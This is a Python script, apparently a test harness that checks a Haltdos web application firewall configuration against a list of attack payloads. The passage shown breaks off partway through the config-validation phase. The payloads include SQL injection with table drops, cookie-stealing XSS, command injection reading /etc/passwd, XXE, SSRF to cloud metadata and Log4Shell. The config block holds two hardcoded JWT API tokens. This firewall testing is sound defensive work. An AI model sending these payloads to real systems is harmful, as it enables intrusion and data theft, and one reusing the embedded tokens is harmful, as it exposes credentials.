import os
import requests
import json
import time
import sys
import socket
from pathlib import Path
from datetime import datetime, timezone
from tabulate import tabulate
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

EVENT_QUEUE = None
CURRENT_PHASE = None


def emit_event(event_type, **kwargs):
    if EVENT_QUEUE is None:
        return
    try:
        payload = {"type": event_type, **kwargs}
        EVENT_QUEUE.put(payload)
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════════════════
#  ▶▶  CONFIGURE THIS BLOCK — THE ONLY THING YOU NEED TO CHANGE  ◀◀
# ════════════════════════════════════════════════════════════════════════════

SETUP_TYPE = "standalone"   # "standalone"  or  "cluster"

# ── Cluster setup (separate management + mitigation IPs) ────────────────────
# Example: mgmt=172.16.0.72, miti=172.16.0.73
#          mgmt=172.16.0.27, miti=172.16.0.28
CLUSTER = {
    "mgmt_ip":           "172.16.0.72",
    "mgmt_port":         443,
    "miti_ip":           "172.16.0.73",
    "api_token":         "eyJhbGciOiJIUzI1NiJ9.eyJhdXRob3JpdHkiOiJUT0tFTl9VU0VSIiwic3ViIjoiZXU4bXJnaXAxbzAzb3FxeSIsImlhdCI6MTc4Mjk2OTA3NH0.HrBWYzvlfNk7eD-uvbhbMa1d_BcF-QPmNRqOWdESJHU",
    "stack_id":          "PAHDIWCFPM",
    "target_listener":   "roti.com",
    "use_https_traffic": False,
}

# ── Standalone setup (single IP handles both management and traffic) ─────────
STANDALONE = {
    "mgmt_ip":           "172.105.59.224",
    "mgmt_port":         9000,
    "api_token":         "eyJhbGciOiJIUzI1NiJ9.eyJhdXRob3JpdHkiOiJUT0tFTl9VU0VSIiwic3ViIjoicXRnc2J5bnBpZmY5a202cyIsImlhdCI6MTc4MzE4NTgzMX0.pbg0nC0Dziu8zyFJyrtmgjV6SAU-EU6TLaghAQ7ocCE",
    "stack_id":          "PZF87FTTHC",
    "target_listener":   "roti.com",
    "use_https_traffic": False,
}

# ── Phases to run — set False to skip any ────────────────────────────────────
RUN_PHASES = {
    "phase1_preflight":  True,
    "phase2_config":     True,
    "phase3_rules":      True,
    "phase4_attacks":    True,
    "phase5_features":   True,
    "phase6_incidents":  True,
    "phase7_report":     True,
}

ATTACK_DELAY = 0.5   # seconds between attack payloads

# ════════════════════════════════════════════════════════════════════════════
#  INTERNAL CONFIG BUILDER — DO NOT EDIT BELOW THIS LINE
# ════════════════════════════════════════════════════════════════════════════
def build_config():
    c    = CLUSTER if SETUP_TYPE == "cluster" else STANDALONE
    miti = c.get("miti_ip", c["mgmt_ip"])  # standalone: same IP for both
    return {
        "setup_type":        SETUP_TYPE,
        "mgmt_host":         f"https://{c['mgmt_ip']}:{c['mgmt_port']}",
        "mgmt_ip":           c["mgmt_ip"],
        "mgmt_port":         c["mgmt_port"],
        "miti_ip":           miti,
        "api_token":         c["api_token"],
        "stack_id":          c["stack_id"],
        "target_listener":   c["target_listener"],
        "use_https_traffic": c["use_https_traffic"],
    }

CONFIG = build_config()


# ════════════════════════════════════════════════════════════════════════════
#  COLOURS + LOGGING HELPERS  (unchanged from v3)
# ════════════════════════════════════════════════════════════════════════════
class C:
    PASS = Fore.GREEN;  FAIL = Fore.RED
    WARN = Fore.YELLOW; INFO = Fore.CYAN
    HEAD = Fore.MAGENTA; BOLD = Style.BRIGHT; R = Style.RESET_ALL


def hdr(text, char="═"):
    w = 72
    print(f"\n{C.HEAD}{C.BOLD}{char*w}\n  {text}\n{char*w}{C.R}")


def subhdr(text):
    print(f"\n{C.INFO}  ── {text} ──{C.R}")


def log(level, msg):
    icons  = {"PASS":"✅","FAIL":"❌","WARN":"⚠️ ","INFO":"ℹ️ ",
              "RUN":"🔄","SKIP":"⏭️ ","DROP":"🚫","REDIR":"↩️ "}
    colors = {"PASS":C.PASS,"FAIL":C.FAIL,"WARN":C.WARN,"INFO":C.INFO,
              "RUN":C.INFO,"SKIP":C.WARN,"DROP":C.PASS,"REDIR":C.PASS}
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}[{ts}] {icons.get(level,'')}  {msg}{C.R}")
    emit_event("log", level=level, message=msg, ts=ts, phase=CURRENT_PHASE)


# ════════════════════════════════════════════════════════════════════════════
#  PHASE RESULT TRACKER  (unchanged from v3)
# ════════════════════════════════════════════════════════════════════════════
class PhaseResult:
    def __init__(self, name):
        self.name      = name
        self.phase     = None
        self.passed    = 0
        self.failed    = 0
        self.skipped   = 0
        self.findings  = []
        self.checks    = []
        self.incidents = []

    def add_check(self, msg, ok=True, warn=False, detail=None):
        self.checks.append({
            "ok": bool(ok),
            "warn": bool(warn),
            "msg": msg,
            "detail": detail or "",
        })

    def ok(self, msg):
        self.passed += 1
        log("PASS", msg)

    def fail(self, msg, finding=None):
        self.failed += 1
        log("FAIL", msg)
        if finding:
            self.findings.append(f"[CRITICAL] {finding}")

    def warn(self, msg, finding=None):
        self.skipped += 1
        log("WARN", msg)
        if finding:
            self.findings.append(f"[WARN] {finding}")

    def skip(self, msg):
        self.skipped += 1
        log("SKIP", msg)

    @property
    def status(self):
        if self.failed == 0 and self.passed > 0: return "PASSED"
        if self.failed > 0  and self.passed > 0: return "PARTIAL"
        if self.failed > 0  and self.passed == 0: return "FAILED"
        return "SKIPPED"

    @property
    def total(self):
        return self.passed + self.failed + self.skipped

    def summary_line(self):
        icon  = {"PASSED":"✅","PARTIAL":"⚠️ ","FAILED":"❌","SKIPPED":"⏭️ "}.get(self.status, "?")
        color = {"PASSED":C.PASS,"PARTIAL":C.WARN,"FAILED":C.FAIL,"SKIPPED":C.WARN}.get(self.status, "")
        return f"{color}{icon}  {self.name:<40} {self.status:<10} ({self.passed}/{self.total}){C.R}"


# ════════════════════════════════════════════════════════════════════════════
#  OFFICIAL HALTDOS API CLIENT  (same endpoints as v3, cleaner error msgs)
# ════════════════════════════════════════════════════════════════════════════
class HaltdosAPI:
    def __init__(self):
        self.host    = CONFIG["mgmt_host"]
        self.stack   = CONFIG["stack_id"]
        self.headers = {
            "Authorization": f"Bearer {CONFIG['api_token']}",
            "Accept":        "application/json",
            "Content-Type":  "application/json",
        }

    def _get(self, path, params=None):
        try:
            r = requests.get(f"{self.host}{path}", headers=self.headers,
                             params=params, verify=False, timeout=15)
            return r, None
        except Exception as e:
            return None, str(e)

    def check_auth(self):
        r, err = self._get(f"/v1/stack/{self.stack}/adc",
                           params={"referenceId": "LISTENER"})
        if err:                    return False, f"Connection error: {err}"
        if r.status_code == 401:   return False, "Token rejected (401) — check API token"
        if r.status_code == 403:   return False, "Forbidden (403) — insufficient permissions"
        if r.status_code == 404:   return False, f"Stack '{self.stack}' not found (404)"
        if r.status_code == 204:   return False, "No content (204) — stack exists but is empty"
        if r.status_code == 200:   return True,  "OK"
        return False, f"Unexpected status {r.status_code}"

    def get_stack_info(self):
        r, err = self._get(f"/v1/stack/{self.stack}")
        if err or r.status_code != 200: return None, err or r.status_code
        try:    return r.json(), None
        except: return None, "JSON parse error"

    def get_listeners(self):
        r, err = self._get(f"/v1/stack/{self.stack}/adc",
                           params={"referenceId": "LISTENER"})
        if err or r.status_code != 200:
            return None, err or f"Status {r.status_code}: {r.text[:150]}"
        try:    return r.json(), None
        except Exception as e: return None, f"JSON error: {e}"

    def find_listener(self, data, name):
        if not data: return None
        items = data.get("data", [])
        if isinstance(items, dict): items = [items]
        for item in items:
            if item.get("listenerName") == name:
                return item
        return None

    def get_incidents(self, ref_id=None, limit=100, minutes_back=60):
        now_ms   = int(datetime.now(timezone.utc).timestamp() * 1000)
        start_ms = now_ms - (minutes_back * 60 * 1000)
        params = {
            "app":         "ADC",
            "page":        0,
            "size":        limit,
            "start":       start_ms,
            "end":         now_ms,
            "referenceId": ref_id or "",
            "category":    "",
            "match":       "",
        }
        r, err = self._get(f"/v1/stack/{self.stack}/incidents", params=params)
        if err:                    return None, err
        if r.status_code != 200:   return None, f"Status {r.status_code}: {r.text[:150]}"
        try:    return r.json(), None
        except Exception as e: return None, f"JSON error: {e}"

    def get_incidents_count(self, ref_id=None, minutes_back=60):
        now_ms   = int(datetime.now(timezone.utc).timestamp() * 1000)
        start_ms = now_ms - (minutes_back * 60 * 1000)
        params   = {"app": "ADC", "start": start_ms, "end": now_ms,
                    "referenceId": ref_id or ""}
        r, err = self._get(f"/v1/stack/{self.stack}/incidents/count", params=params)
        if err or r.status_code != 200: return None, err or r.status_code
        try:    return r.json(), None
        except: return None, "parse error"

    def get_ioc_list(self, minutes_back=60):
        now_ms   = int(datetime.now(timezone.utc).timestamp() * 1000)
        start_ms = now_ms - (minutes_back * 60 * 1000)
        params   = {"App": "ADC", "Start Timestamp": start_ms, "End Timestamp": now_ms}
        r, err   = self._get(f"/v1/stack/{self.stack}/tools/ioc", params=params)
        if err or r.status_code != 200: return None, err or r.status_code
        try:    return r.json(), None
        except: return None, "parse error"

    def get_events(self, minutes_back=60):
        now_ms   = int(datetime.now(timezone.utc).timestamp() * 1000)
        start_ms = now_ms - (minutes_back * 60 * 1000)
        params   = {"app": "ADC", "start": start_ms, "end": now_ms, "page": 0, "size": 20}
        r, err = self._get(f"/v1/stack/{self.stack}/events", params=params)
        if err or r.status_code != 200: return None, err or r.status_code
        try:    return r.json(), None
        except: return None, "parse error"


# ════════════════════════════════════════════════════════════════════════════
#  LISTENER INFO PARSER  (expanded from v3 — same fields + extras)
# ════════════════════════════════════════════════════════════════════════════
class ListenerInfo:
    def __init__(self, raw):
        self.raw           = raw
        self.listener_id   = raw.get("listenerId", "?")
        self.listener_name = raw.get("listenerName", "?")
        self.domain        = raw.get("domain", "?")
        self.enabled       = raw.get("enabled", False)
        m                  = raw.get("modules", {})

        # GENERAL (from DEFAULT/global profile)
        try:
            gen               = m["PROFILES"]["global"]["modules"]["GENERAL"]
            self.mode         = gen.get("mode", "UNKNOWN")
            self.paranoia     = gen.get("paranoia", "UNKNOWN")
            self.sig_on       = gen.get("enableSignature", None)
            self.resp_inspect = gen.get("enableResponseInspect", None)
        except:
            self.mode = self.paranoia = "UNKNOWN"
            self.sig_on = self.resp_inspect = None

        # BOT
        try:
            bot               = m["PROFILES"]["global"]["modules"]["BOT"]
            self.bot_bad_rep  = bot.get("badReputationTraffic", "NO_ACTION")
            self.bot_tor      = bot.get("torTraffic", "NO_ACTION")
            self.bot_proxy    = bot.get("proxyTraffic", "NO_ACTION")
            self.bot_adv      = bot.get("advancedProtection", "NONE")
        except:
            self.bot_bad_rep = self.bot_tor = self.bot_proxy = self.bot_adv = "UNKNOWN"

        # WEB POLICY
        try:
            web                    = m["PROFILES"]["global"]["modules"]["POLICY"]["modules"]["WEB"]
            self.allowed_methods   = web.get("allowedHttpMethods", [])
            self.hsts              = web.get("hsts", "DISABLED")
            self.xframe            = web.get("xFrame", "DISABLED")
            self.csrf_enabled      = web.get("csrfEnabled", False)
            self.restricted_ext    = web.get("restrictedExtensions", [])
            self.max_header_len    = web.get("maxHttpHeaderFieldValueLength", "?")
        except:
            self.allowed_methods = []
            self.hsts = self.xframe = "UNKNOWN"
            self.csrf_enabled = False
            self.restricted_ext = []
            self.max_header_len = "?"

        # OPERATIONAL
        try:
            op                = m["OPERATIONAL"]
            self.log_enabled  = op.get("enableLog", False)
            self.session_log  = op.get("enableSessionLog", False)
            self.host_check   = op.get("hostCheck", False)
        except:
            self.log_enabled = self.session_log = self.host_check = False

        # SSL
        try:
            ssl                = m["SSL"]
            self.ssl_enabled   = ssl.get("enabled", False)
            self.ssl_cert_id   = ssl.get("certId", "")
            self.cipher_suite  = ssl.get("cipherSuite", "?")
            self.verify_client = ssl.get("verifyClient", "OFF")
        except:
            self.ssl_enabled   = False
            self.ssl_cert_id   = ""
            self.cipher_suite  = "?"
            self.verify_client = "?"

        # BACKEND
        try:
            sg           = m["SERVER_GROUPS"]["global"]["modules"]["SERVERS"]["servers"]
            k            = list(sg.keys())[0]
            self.backend = f"{sg[k].get('server','?')}:{int(sg[k].get('port',0))}"
        except:
            self.backend = "UNKNOWN"

        # ANTIVIRUS
        try:
            self.av_mode = m["PROFILES"]["global"]["modules"]["ANTIVIRUS"].get("mode", "DISABLE")
        except:
            self.av_mode = "UNKNOWN"

        # GEO
        try:
            geo            = m["PROFILES"]["global"]["modules"]["GEO_IP"]
            self.geo_countries = geo.get("blackListedCountries", [])
            self.geo_prefixes  = geo.get("prefixBlacklist", [])
            self.has_geo       = bool(self.geo_countries or self.geo_prefixes)
        except:
            self.geo_countries = []
            self.geo_prefixes  = []
            self.has_geo       = False

        # LEARNING
        try:
            self.learning_mode = m.get("LEARNING", {}).get("mode", "UNKNOWN")
        except:
            self.learning_mode = "UNKNOWN"

        # All security profiles (global + any extras)
        try:
            pb = m["PROFILES"]
            extras = pb.get("profiles", {})
            self.all_profiles = {"DEFAULT": pb.get("global", {})}
            if isinstance(extras, dict):
                self.all_profiles.update(extras)
            elif isinstance(extras, list):
                for p in extras:
                    pid = p.get("name", p.get("profileId", "unknown"))
                    self.all_profiles[pid] = p
        except:
            self.all_profiles = {}

    def print_info(self):
        rows = [
            ["Listener Name",    self.listener_name],
            ["Listener ID",      self.listener_id],
            ["Domain",           self.domain],
            ["Enabled",          "✅ Yes" if self.enabled else "❌ No"],
            ["WAF Mode",         f"{'✅' if self.mode=='MITIGATION' else '⚠️ '} {self.mode}"],
            ["Paranoia Level",   f"{'✅' if self.paranoia in ('HIGH','PARANOID') else '⚠️ '} {self.paranoia}"],
            ["Signatures",       "✅ On" if self.sig_on else "❌ Off"],
            ["Response Inspect", "✅ On" if self.resp_inspect else "❌ Off"],
            ["SSL",              f"{'✅' if self.ssl_enabled else '❌'} {'Enabled' if self.ssl_enabled else 'Disabled'}"],
            ["Cipher Suite",     self.cipher_suite],
            ["Backend",          self.backend],
            ["HSTS",             self.hsts],
            ["X-Frame-Options",  self.xframe],
            ["CSRF",             "✅ On" if self.csrf_enabled else "❌ Off"],
            ["Host Check",       "✅ On" if self.host_check else "⚠️  Off"],
            ["Logging",          "✅ On" if self.log_enabled else "❌ Off"],
            ["Antivirus",        self.av_mode],
            ["Bot - Bad Rep",    self.bot_bad_rep],
            ["Bot - TOR",        self.bot_tor],
            ["Bot - Advanced",   self.bot_adv],
            ["Learning Mode",    self.learning_mode],
            ["Geo-IP",           f"{len(self.geo_countries)} countries blocked" if self.has_geo else "Not configured"],
        ]
        print(tabulate(rows, tablefmt="simple"))


# ════════════════════════════════════════════════════════════════════════════
#  v4 NEW: BLOCK DETECTION LOGIC
#  This is the core fix — v3 only checked for hard status codes.
#  Real WAF behaviour: DROP (403), REDIRECT (302→WAF page), or CONNECTION RESET
# ════════════════════════════════════════════════════════════════════════════

# Hard block status codes
HARD_BLOCK_CODES = {400, 403, 406, 429, 444}

# WAF internal redirect patterns — if Location header contains these, it's a soft block
WAF_REDIRECT_PATTERNS = [
    "/__verify/",
    "/haltdos/",
    "/captcha",
    "/crypto",
    "/blocked",
    "/challenge",
    "/waf-block",
    "/error",
]


def check_if_blocked(status_code, response_obj=None):
    """
    v4 ENHANCEMENT over v3:
    Returns (is_blocked: bool, result_type: str)

    Result types:
      BLOCKED      — hard block (403/406/429/444/400)
      REDIRECTED   — WAF soft block via 302 → internal challenge/error page
      DROPPED      — WAF killed the TCP connection (CONN_ERR / TIMEOUT)
      PASSED_THROUGH — request reached the backend unblocked
      ERROR        — something went wrong with the request itself
    """
    # Connection-level block — WAF killed the connection before responding
    if status_code in ("CONN_ERR", "TIMEOUT"):
        return True, "DROPPED"

    if not isinstance(status_code, int):
        return False, "ERROR"

    # Hard block
    if status_code in HARD_BLOCK_CODES:
        return True, "BLOCKED"

    # Soft block — 302/301 redirect TO a WAF internal challenge or error page
    if status_code in (301, 302) and response_obj is not None:
        location = response_obj.headers.get("Location", "")
        if any(pattern in location for pattern in WAF_REDIRECT_PATTERNS):
            return True, "REDIRECTED"

    return False, "PASSED_THROUGH"


# ════════════════════════════════════════════════════════════════════════════
#  ATTACK PAYLOAD DEFINITIONS  (expanded from v3 — 43 payloads)
# ════════════════════════════════════════════════════════════════════════════
ATTACK_PAYLOADS = [
    # ── SQL Injection ────────────────────────────────────────────────────────
    ("SQLi-01", "SQL Injection", "Classic OR bypass",            "/?id=", "1' OR '1'='1"),
    ("SQLi-02", "SQL Injection", "UNION SELECT dump",            "/?id=", "1 UNION SELECT null,username,password FROM users--"),
    ("SQLi-03", "SQL Injection", "Blind boolean",                "/?id=", "1 AND 1=1--"),
    ("SQLi-04", "SQL Injection", "Time-based SLEEP",             "/?id=", "1' AND SLEEP(5)--"),
    ("SQLi-05", "SQL Injection", "Error-based extraction",       "/?id=", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
    ("SQLi-06", "SQL Injection", "Stacked query drop",           "/?id=", "1; DROP TABLE users--"),
    ("SQLi-07", "SQL Injection", "WAITFOR DELAY (MSSQL)",        "/?id=", "1; WAITFOR DELAY '0:0:5'--"),
    # ── XSS ─────────────────────────────────────────────────────────────────
    ("XSS-01",  "XSS",           "Basic script tag",             "/?q=",  "<script>alert(1)</script>"),
    ("XSS-02",  "XSS",           "IMG onerror",                  "/?q=",  "<img src=x onerror=alert(1)>"),
    ("XSS-03",  "XSS",           "SVG onload",                   "/?q=",  "<svg onload=alert(document.cookie)>"),
    ("XSS-04",  "XSS",           "JS protocol redirect",         "/?redirect=", "javascript:alert(1)"),
    ("XSS-05",  "XSS",           "Event handler",                "/?q=",  "'\"><body onmouseover=alert(1)>"),
    ("XSS-06",  "XSS",           "Data URI",                     "/?q=",  "<object data='data:text/html,<script>alert(1)</script>'>"),
    # ── Path Traversal ───────────────────────────────────────────────────────
    ("PT-01",   "Path Traversal","Basic Linux traversal",         "/?file=", "../../../etc/passwd"),
    ("PT-02",   "Path Traversal","URL-encoded traversal",         "/?file=", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("PT-03",   "Path Traversal","Double URL-encoded",            "/?file=", "%252e%252e%252fetc%252fpasswd"),
    ("PT-04",   "Path Traversal","Windows path",                  "/?file=", "..\\..\\..\\windows\\system32\\hosts"),
    # ── Command Injection ────────────────────────────────────────────────────
    ("CI-01",   "Cmd Injection", "Semicolon chain",               "/?host=", "127.0.0.1; cat /etc/passwd"),
    ("CI-02",   "Cmd Injection", "Pipe injection",                "/?host=", "127.0.0.1 | id"),
    ("CI-03",   "Cmd Injection", "Backtick injection",            "/?host=", "`whoami`"),
    ("CI-04",   "Cmd Injection", "AND operator",                  "/?host=", "127.0.0.1 && id"),
    # ── LFI ─────────────────────────────────────────────────────────────────
    ("LFI-01",  "LFI",           "PHP filter wrapper",            "/?page=", "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ("LFI-02",  "LFI",           "PHP input wrapper",             "/?page=", "php://input"),
    ("LFI-03",  "LFI",           "Null byte bypass",              "/?page=", "../../../etc/passwd%00"),
    # ── Sensitive Files ──────────────────────────────────────────────────────
    ("SFA-01",  "Sensitive Files","/.env access",                 "/.env",         ""),
    ("SFA-02",  "Sensitive Files","/.git/config",                 "/.git/config",  ""),
    ("SFA-03",  "Sensitive Files","/phpMyAdmin",                  "/phpmyadmin/",  ""),
    ("SFA-04",  "Sensitive Files","/wp-config.php",               "/wp-config.php",""),
    ("SFA-05",  "Sensitive Files","DB backup .sql",               "/db.sql",       ""),
    # ── Bot Detection ────────────────────────────────────────────────────────
    ("BOT-01",  "Bot Detection", "SQLmap UA",                     "/", ""),
    ("BOT-02",  "Bot Detection", "Nikto UA",                      "/", ""),
    ("BOT-03",  "Bot Detection", "Acunetix UA",                   "/", ""),
    ("BOT-04",  "Bot Detection", "Nessus UA",                     "/", ""),
    # ── HTTP Attacks ─────────────────────────────────────────────────────────
    ("HTTP-01", "HTTP Attack",   "Oversized header",              "/",     ""),
    ("HTTP-02", "HTTP Attack",   "Null byte in param",            "/?q=",  "test\x00injection"),
    ("HTTP-03", "HTTP Attack",   "Very long URL",                 "/",     ""),
    # ── OWASP ────────────────────────────────────────────────────────────────
    ("OWASP-01","OWASP",         "XXE injection",                 "/?xml=", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><foo>&x;</foo>"),
    ("OWASP-02","OWASP",         "SSRF AWS metadata",             "/?url=", "http://169.254.169.254/latest/meta-data/"),
    ("OWASP-03","OWASP",         "SSRF localhost",                "/?url=", "http://127.0.0.1:22/"),
    ("OWASP-04","OWASP",         "SSTI template injection",       "/?name=","{{7*7}}"),
    ("OWASP-05","OWASP",         "Log4Shell via header",          "/",      ""),
    ("OWASP-06","OWASP",         "CRLF injection",                "/?q=",   "test%0d%0aSet-Cookie:injected=1"),
    ("OWASP-07","OWASP",         "Open redirect",                 "/?next=","//evil.com"),
]

BOT_UA = {
    "BOT-01": "sqlmap/1.0-dev-xxxxxxx (https://sqlmap.org)",
    "BOT-02": "Nikto/2.1.6",
    "BOT-03": "acunetix-product/1.0 (Acunetix Web Vulnerability Scanner)",
    "BOT-04": "Nessus SOAP v0.0.1",
}


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — PRE-FLIGHT  (same as v3, works for standalone + cluster)
# ════════════════════════════════════════════════════════════════════════════
def phase1_preflight(api):
    hdr("PHASE 1 — PRE-FLIGHT CHECKS")
    r = PhaseResult("Phase 1 — Pre-flight")

    # 1.1 Management console reachability
    subhdr("1.1 Management Console Connectivity")
    try:
        s = socket.create_connection((CONFIG["mgmt_ip"], CONFIG["mgmt_port"]), timeout=5)
        s.close()
        r.ok(f"Management reachable → {CONFIG['mgmt_ip']}:{CONFIG['mgmt_port']}")
    except Exception as e:
        r.fail(f"Management NOT reachable: {e}",
               f"Cannot reach {CONFIG['mgmt_ip']}:{CONFIG['mgmt_port']}")

    # 1.2 Traffic / mitigation IP reachability
    subhdr("1.2 Traffic / Mitigation IP Connectivity")
    traffic_port = 443 if CONFIG["use_https_traffic"] else 80
    try:
        s = socket.create_connection((CONFIG["miti_ip"], traffic_port), timeout=5)
        s.close()
        r.ok(f"Traffic IP reachable → {CONFIG['miti_ip']}:{traffic_port}")
    except Exception as e:
        r.fail(f"Traffic IP NOT reachable on port {traffic_port}: {e}",
               f"Cannot reach mitigation IP {CONFIG['miti_ip']}:{traffic_port}")

    # 1.3 Setup type validation
    subhdr("1.3 Setup Type Validation")
    if SETUP_TYPE == "cluster":
        if CONFIG["mgmt_ip"] != CONFIG["miti_ip"]:
            r.ok(f"Cluster: mgmt={CONFIG['mgmt_ip']} | miti={CONFIG['miti_ip']}")
        else:
            r.warn("Cluster mode set but both IPs are the same — did you mean standalone?")
    else:
        r.ok(f"Standalone: single IP {CONFIG['mgmt_ip']} handles both roles")

    # 1.4 API authentication
    subhdr("1.4 API Authentication")
    ok, msg = api.check_auth()
    if ok:
        r.ok("API token valid — authenticated successfully")
    else:
        r.fail(f"API auth failed — {msg}", msg)
        return r, None, None

    # 1.5 Stack information
    subhdr("1.5 Stack Information")
    stack_data, err = api.get_stack_info()
    if stack_data:
        s = stack_data.get("data", {})
        if isinstance(s, dict):
            stack = s.get("stack", s)
            plan  = stack.get("licensePlan", {})
            r.ok(f"Stack: {stack.get('stackName', CONFIG['stack_id'])} | "
                 f"Plan: {plan.get('edition', 'N/A')}")
        else:
            r.warn("Stack info returned — format not as expected")
    else:
        r.warn(f"Could not fetch stack info: {err} (non-critical)")

    # 1.6 Listener discovery
    subhdr("1.6 Listener Discovery")
    data, err = api.get_listeners()
    if err:
        r.fail(f"Cannot fetch listeners: {err}", err)
        return r, None, None

    items = data.get("data", [])
    if isinstance(items, dict):
        items = [items]

    log("INFO", f"Found {len(items)} listener(s) on stack {CONFIG['stack_id']}:")
    rows = []
    for item in items:
        name    = item.get("listenerName", "?")
        enabled = "✅" if item.get("enabled", False) else "❌"
        try:
            mode = item["modules"]["PROFILES"]["global"]["modules"]["GENERAL"]["mode"]
        except:
            mode = "?"
        try:
            sg  = item["modules"]["SERVER_GROUPS"]["global"]["modules"]["SERVERS"]["servers"]
            k   = list(sg.keys())[0]
            bk  = f"{sg[k]['server']}:{int(sg[k].get('port', 0))}"
        except:
            bk = "?"
        ssl_on = "🔒" if item.get("modules", {}).get("SSL", {}).get("enabled", False) else "🔓"
        rows.append([name, mode, bk, enabled, ssl_on])

    print()
    print(tabulate(rows, headers=["Listener", "Mode", "Backend", "Enabled", "SSL"], tablefmt="simple"))
    print()
    r.ok(f"{len(items)} listener(s) discovered")

    # 1.7 Target listener lookup
    subhdr(f"1.7 Target Listener: {CONFIG['target_listener']}")
    target = api.find_listener(data, CONFIG["target_listener"])
    if not target:
        r.fail(f"Listener '{CONFIG['target_listener']}' not found!",
               "Change 'target_listener' in CONFIG to one of the names shown above")
        return r, None, None

    info = ListenerInfo(target)
    r.ok(f"Target listener found: {info.listener_name}")
    print()
    info.print_info()
    print()

    if not info.enabled:
        r.fail("Listener is DISABLED — enable it first", "Listener disabled")

    return r, info, data


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — CONFIG VALIDATION
#  v4 ENHANCEMENT: checks per-profile mode, not just listener-level mode
#  (Image 3 shows DEFAULT profile can have its own RECORD/MITIGATION mode)
# ════════════════════════════════════════════════════════════════════════════
def phase2_config(info: ListenerInfo, raw_listener: dict):
    hdr("PHASE 2 — WAF CONFIGURATION VALIDATION")
    r = PhaseResult("Phase 2 — Config Validation")

    # 2.1 Listener state
    subhdr("2.1 Listener State")
    if info.enabled:
        r.ok("Listener is ENABLED")
        r.add_check("Listener is ENABLED", ok=True, detail="Listener must be enabled for traffic inspection")
    else:
        r.fail("Listener is DISABLED", "Enable the listener in the GUI first")
        r.add_check("Listener is DISABLED", ok=False, detail="Enable the listener in the GUI first")

    # 2.2 Per-profile mode check — THE KEY v4 ADDITION
    # In Haltdos, each security profile has its OWN mode setting.
    # A listener can say MITIGATION but if the DEFAULT profile says RECORD,
    # that profile's traffic won't be blocked. We check ALL profiles.
    subhdr("2.2 Security Profile Mode Check (per profile)")
    log("INFO", "Each security profile has its own mode — ALL must be MITIGATION to block attacks")
    profile_rows = []

    for pname, pdata in info.all_profiles.items():
        if not pdata:
            continue
        try:
            gen  = pdata["modules"]["GENERAL"]
            mode = gen.get("mode", "UNKNOWN")
            par  = gen.get("paranoia", "UNKNOWN")
            sig  = "✅" if gen.get("enableSignature", False) else "❌"
            resp = "✅" if gen.get("enableResponseInspect", False) else "❌"
            profile_rows.append([pname, mode, par, sig, resp])

            if mode == "MITIGATION":
                r.ok(f"Profile '{pname}': MITIGATION ✅ — attacks will be blocked")
                r.add_check(f"Profile '{pname}': MITIGATION mode", ok=True, detail="WAF profile is in MITIGATION mode")
            elif mode == "RECORD":
                r.fail(
                    f"Profile '{pname}': RECORD ❌ — attacks logged only, NOT blocked",
                    f"Profile '{pname}' is in RECORD mode — go to Security Profiles → "
                    f"{pname} → Settings → Operational Mode → change to MITIGATION"
                )
                r.add_check(f"Profile '{pname}': RECORD mode", ok=False, detail="Change this profile to MITIGATION for blocking")
            elif mode == "BYPASSED":
                r.fail(
                    f"Profile '{pname}': BYPASSED ❌ — WAF completely inactive for this profile",
                    f"Profile '{pname}' is BYPASSED — WAF has zero effect on matching traffic"
                )
                r.add_check(f"Profile '{pname}': BYPASSED mode", ok=False, detail="Profile is bypassed and will not block traffic")
            else:
                r.warn(f"Profile '{pname}': unknown mode '{mode}'")
                r.add_check(f"Profile '{pname}': unknown mode {mode}", ok=False, warn=True,
                            detail="Cannot determine profile mode from API response")

            if par in ("HIGH", "PARANOID"):
                r.ok(f"Profile '{pname}': paranoia {par} ✅")
                r.add_check(f"Profile '{pname}': paranoia {par}", ok=True)
            elif par == "MEDIUM":
                r.warn(f"Profile '{pname}': paranoia MEDIUM — HIGH recommended",
                       f"Profile '{pname}': upgrade paranoia from MEDIUM to HIGH")
                r.add_check(f"Profile '{pname}': paranoia MEDIUM", ok=False, warn=True,
                            detail="MEDIUM is allowed but HIGH is recommended")
            else:
                r.warn(f"Profile '{pname}': paranoia {par} — consider upgrading to HIGH",
                       f"Profile '{pname}': paranoia level is {par}")
                r.add_check(f"Profile '{pname}': paranoia {par}", ok=False, warn=True,
                            detail="Use HIGH or PARANOID for stronger protection")

            if not gen.get("enableSignature", False):
                r.fail(f"Profile '{pname}': Signature detection DISABLED",
                       f"Profile '{pname}': Enable signature detection")
                r.add_check(f"Profile '{pname}': signature detection disabled", ok=False,
                            detail="Signature detection should be enabled")
            else:
                r.ok(f"Profile '{pname}': Signature detection ENABLED")
                r.add_check(f"Profile '{pname}': signature detection enabled", ok=True)

        except (KeyError, TypeError) as e:
            r.warn(f"Profile '{pname}': could not read settings — {e}")

    if profile_rows:
        print()
        print(tabulate(profile_rows,
                       headers=["Profile", "Mode", "Paranoia", "Signatures", "Resp.Inspect"],
                       tablefmt="simple"))
        print()

    # 2.3 Request logging
    subhdr("2.3 Request Logging")
    if info.log_enabled:
        r.ok("Request logging ENABLED")
        r.add_check("Request logging ENABLED", ok=True)
    else:
        r.fail("Request logging DISABLED — no traffic visibility",
               "Enable logging in Listener → Settings → Operational → Enable Logging")
        r.add_check("Request logging DISABLED", ok=False,
                    detail="Enable request logging so attack traffic can be inspected")

    # 2.4 SSL/TLS
    subhdr("2.4 SSL/TLS Configuration")
    if info.ssl_enabled:
        r.ok(f"SSL enabled — cipher suite: {info.cipher_suite}")
        r.add_check(f"SSL enabled — cipher suite: {info.cipher_suite}", ok=True)
        if info.cipher_suite in ("WEAK", "LEGACY", "?"):
            r.warn("Weak SSL cipher suite detected",
                   "Upgrade SSL cipher suite to INTERMEDIATE or MODERN")
            r.add_check("Weak SSL cipher suite detected", ok=False, warn=True,
                        detail="Use a stronger cipher suite for production")
    else:
        r.warn("SSL DISABLED — traffic travels over plain HTTP",
               "Enable SSL in Listener → SSL Management for production")
